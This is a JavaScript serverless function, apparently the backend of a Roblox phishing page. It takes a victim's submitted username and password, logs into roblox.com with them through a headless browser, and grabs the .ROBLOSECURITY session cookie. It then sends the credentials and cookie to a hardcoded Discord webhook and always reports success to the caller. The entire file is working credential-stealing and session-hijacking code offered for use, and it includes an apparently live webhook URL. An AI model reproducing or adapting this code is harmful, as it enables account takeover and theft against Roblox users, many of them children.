const puppeteer = require('puppeteer');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).end();

  const { user, pass } = req.body;

  const webhook = 'https://discord.com/api/webhooks/1445135996541997319/m1OTOwU8ik-uLCzuLm8sXmpzfWAPtVAKGZE_CSEATIWm1EVvhi3DXkh8tCorNNormjG0'; // CHANGE THIS

  try {
    const browser = await puppeteer.launch({ 
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();
    
    await page.goto('https://www.roblox.com/login', { waitUntil: 'networkidle2' });
    
    await page.type('#login-username', user);
    await page.type('#login-password', pass);
    await page.click('#login-button');
    
    await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => {});

    const cookies = await page.cookies();
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY')?.value;

    await browser.close();

    if (robloxCookie) {
      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "Roblox Cookie Grabbed",
            description: `**User:** ${user}\n**Pass:** ||${pass}||\n**Cookie:** \`\`\`${robloxCookie.substring(0, 500)}...\`\`\``,
            color: 0x00ff9d,
            timestamp: new Date()
          }]
        })
      });
    }
  } catch (e) {}

  res.status(200).json({ success: true });
};
